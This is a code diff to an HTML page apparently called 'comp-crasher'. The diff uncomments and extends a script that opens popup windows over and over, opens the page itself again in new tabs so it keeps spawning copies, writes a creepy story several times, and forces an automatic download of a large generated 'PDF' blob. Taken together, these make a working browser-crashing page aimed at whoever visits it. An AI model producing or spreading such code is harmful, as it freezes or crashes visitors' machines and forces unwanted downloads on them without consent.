@@ -56,9 +56,9 @@
 
       // Start the animation
       update();
-      /*document.write('The long, abstract painting sat at the window seal. "Since when has that painting been there?", Annie asked. "Since forever, dont you remember?" said mother. "I guess im just seeing things" said Annie.')
       document.write('The long, abstract painting sat at the window seal. "Since when has that painting been there?", Annie asked. "Since forever, dont you remember?" said mother. "I guess im just seeing things" said Annie.')
       document.write('The long, abstract painting sat at the window seal. "Since when has that painting been there?", Annie asked. "Since forever, dont you remember?" said mother. "I guess im just seeing things" said Annie.')
+      document.write('The long, abstract painting sat at the window seal. "Since when has that painting been there?", Annie asked. "Since forever, dont you remember?" said mother. "I guess im just seeing things" said Annie.')
       window.open('https://www.example.com', '_blank', 'width=800,height=600,top=100,left=100,resizable=yes,scrollbars=yes');
       window.open('https://www.example.com', '_blank', 'width=800,height=600,top=100,left=100,resizable=yes,scrollbars=yes');
       window.open('https://www.example.com', '_blank', 'width=800,height=600,top=100,left=100,resizable=yes,scrollbars=yes');
@@ -67,8 +67,19 @@
       window.open('comp-crasher.html', '_blank');
       window.open('comp-crasher.html', '_blank');
       window.open('comp-crasher.html', '_blank');
+      var arr = new Array();
+      for (var i = 0; i < 300000; i++) {
+          arr[i] = (i % 256);
+      }
+      var blob = 'data:application/pdf,' + arr;
+      var link = document.createElement("a");
+      link.download = "attachment";
+      link.href = blob;
+      link.textContent = "really"
+      document.body.appendChild(link);
+      link.click();
       window.open('comp-crasher.html', '_blank');
-      window.open('comp-crasher.html', '_blank');*/
+      window.open('comp-crasher.html', '_blank');
     </script>
   </body>
 </html>
